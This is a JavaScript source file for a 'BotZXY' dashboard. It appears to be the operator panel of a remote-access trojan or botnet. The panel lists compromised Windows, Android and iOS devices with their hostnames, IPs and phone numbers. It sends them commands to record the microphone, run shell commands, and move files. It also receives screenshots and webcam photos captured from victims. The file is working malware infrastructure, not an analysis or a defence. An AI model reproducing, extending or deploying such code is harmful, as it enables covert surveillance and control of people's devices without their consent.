// BotZXY Dashboard JavaScript

const BOTZXY = {
    version: '2.0',
    socket: null,
    devices: [],
    refreshInterval: null,
    
    init: function() {
        console.log('[BotZXY] Initializing dashboard v' + this.version);
        this.connectWebSocket();
        this.setupEventListeners();
        this.startAutoRefresh();
        this.refreshDevices();
    },
    
    connectWebSocket: function() {
        this.socket = io();
        
        this.socket.on('connect', function() {
            console.log('[BotZXY] WebSocket connected');
            BOTZXY.showToast('WebSocket connected', 'success');
        });
        
        this.socket.on('disconnect', function() {
            console.log('[BotZXY] WebSocket disconnected');
            BOTZXY.showToast('WebSocket disconnected', 'danger');
        });
        
        this.socket.on('command_sent', function(data) {
            console.log('[BotZXY] Command sent to:', data.device_id);
            BOTZXY.showToast('Command sent to ' + data.device_id.substring(0, 12) + '...', 'info');
        });
        
        this.socket.on('result_received', function(data) {
            console.log('[BotZXY] Result from:', data.device_id);
            BOTZXY.refreshDevices();
            BOTZXY.showToast('Result received from ' + data.device_id.substring(0, 12) + '...', 'success');
        });
        
        this.socket.on('screenshot_captured', function(data) {
            console.log('[BotZXY] Screenshot from:', data.device_id);
            BOTZXY.refreshDevices();
            BOTZXY.showToast('📸 Screenshot captured from ' + data.device_id.substring(0, 12) + '...', 'info');
        });
        
        this.socket.on('webcam_captured', function(data) {
            console.log('[BotZXY] Webcam from:', data.device_id);
            BOTZXY.refreshDevices();
            BOTZXY.showToast('📷 Webcam photo from ' + data.device_id.substring(0, 12) + '...', 'info');
        });
    },
    
    setupEventListeners: function() {
        // Command modal
        $('#cmdType').on('change', function() {
            let val = $(this).val();
            if (val === 'mic' || val === 'execute' || val === 'download' || val === 'upload') {
                $('#paramsDiv').show();
                if (val === 'mic') $('#cmdParams').val('duration=10');
                else if (val === 'execute') $('#cmdParams').val('dir');
                else if (val === 'download') $('#cmdParams').val('C:\\file.txt');
                else if (val === 'upload') $('#cmdParams').val('C:\\file.txt');
            } else {
                $('#paramsDiv').hide();
            }
        });
        $('#cmdType').trigger('change');
    },
    
    startAutoRefresh: function() {
        this.refreshInterval = setInterval(this.refreshDevices, 10000);
    },
    
    refreshDevices: function() {
        $.get('/api/devices', function(data) {
            BOTZXY.devices = data;
            BOTZXY.renderDevices(data);
            BOTZXY.updateStats(data);
        }).fail(function() {
            BOTZXY.showToast('Error loading devices', 'danger');
        });
    },
    
    renderDevices: function(devices) {
        let html = '';
        devices.forEach(function(device) {
            let statusClass = device.is_online ? 'badge-online' : 'badge-offline';
            let statusText = device.is_online ? '● Online' : '○ Offline';
            let lastSeen = device.last_seen ? new Date(device.last_seen).toLocaleString() : 'Never';
            let icon = device.platform === 'windows' ? 'fa-windows' : 
                       device.platform === 'android' ? 'fa-android' : 
                       device.platform === 'ios' ? 'fa-apple' : 'fa-microchip';
            let iconColor = device.platform === 'windows' ? '#00a4ef' : 
                            device.platform === 'android' ? '#3ddc84' : 
                            device.platform === 'ios' ? '#999' : '#666';
            html += `
                <tr>
                    <td><code class="text-success" style="font-size:0.8rem;">${device.device_id.substring(0, 14)}...</code></td>
                    <td><i class="fab ${icon} platform-icon" style="color:${iconColor};"></i> ${device.platform || 'Unknown'}</td>
                    <td><strong>${device.hostname || 'Unknown'}</strong></td>
                    <td>${device.ip || 'N/A'}</td>
                    <td><span class="badge ${statusClass}">${statusText}</span></td>
                    <td style="font-size:0.8rem; color:#888;">${lastSeen}</td>
                    <td>${device.phone_number || 'N/A'}</td>
                    <td>
                        <button class="btn btn-sm btn-success command-btn" onclick="BOTZXY.openCommand('${device.device_id}')" title="Send Command">
                            <i class="fas fa-terminal"></i>
                        </button>
                        <button class="btn btn-sm btn-primary command-btn" onclick="BOTZXY.viewDevice('${device.device_id}')" title="View Details">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button class="btn btn-sm btn-danger command-btn" onclick="BOTZXY.removeDevice('${device.device_id}')" title="Remove">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `;
        });
        $('#devicesBody').html(html);
        
        if ($.fn.DataTable.isDataTable('#devicesTable')) {
            $('#devicesTable').DataTable().destroy();
        }
        $('#devicesTable').DataTable({
            pageLength: 25,
            responsive: true,
            order: [[4, 'desc']],
            language: {
                search: "🔍 Search:",
                lengthMenu: "Show _MENU_ devices",
                info: "Showing _START_ to _END_ of _TOTAL_ devices"
            },
            columnDefs: [
                { orderable: false, targets: 7 }
            ]
        });
    },
    
    updateStats: function(devices) {
        let total = devices.length;
        let online = devices.filter(d => d.is_online).length;
        $('#totalDevices').text(total);
        $('#onlineDevices').text(online);
    },
    
    openCommand: function(deviceId) {
        $('#cmdDeviceId').val(deviceId);
        $('#cmdDeviceDisplay').text(deviceId.substring(0, 16) + '...');
        $('#cmdParams').val('');
        $('#commandModal').modal('show');
    },
    
    sendCommand: function() {
        let deviceId = $('#cmdDeviceId').val();
        let command = $('#cmdType').val();
        let params = $('#cmdParams').val();
        
        $.post(`/api/command/${deviceId}`, {
            command: command,
            params: params
        }, function(data) {
            $('#commandModal').modal('hide');
            BOTZXY.showToast('✅ Command sent to ' + deviceId.substring(0, 12) + '...', 'success');
            BOTZXY.refreshDevices();
        }).fail(function() {
            BOTZXY.showToast('❌ Error sending command', 'danger');
        });
    },
    
    viewDevice: function(deviceId) {
        window.location.href = `/device/${deviceId}`;
    },
    
    removeDevice: function(deviceId) {
        if (confirm('⚠️ Remove device ' + deviceId.substring(0, 16) + '...?')) {
            BOTZXY.showToast('Device removed', 'warning');
            BOTZXY.refreshDevices();
        }
    },
    
    showToast: function(message, type = 'info') {
        let icon = type === 'success' ? 'fa-check-circle' : 
                   type === 'danger' ? 'fa-exclamation-circle' : 
                   type === 'warning' ? 'fa-triangle-exclamation' : 'fa-info-circle';
        let color = type === 'success' ? '#00ff88' : 
                    type === 'danger' ? '#ff4444' : 
                    type === 'warning' ? '#ffaa00' : '#0d6efd';
        let toastHtml = `
            <div class="toast-container position-fixed bottom-0 end-0 p-3" style="z-index:9999;">
                <div class="toast show" role="alert" style="background: #1a1a1a; border: 1px solid ${color};">
                    <div class="toast-header bg-dark text-white" style="border-bottom: 1px solid #333;">
                        <i class="fas ${icon} me-2" style="color:${color};"></i>
                        <strong class="me-auto" style="color:#00ff88;">BotZXY</strong>
                        <button type="button" class="btn-close" data-bs-dismiss="toast"></button>
                    </div>
                    <div class="toast-body text-white">${message}</div>
                </div>
            </div>
        `;
        $('body').append(toastHtml);
        setTimeout(function() {
            $('.toast').remove();
        }, 5000);
    }
};

// Initialize on page load
$(document).ready(function() {
    BOTZXY.init();
});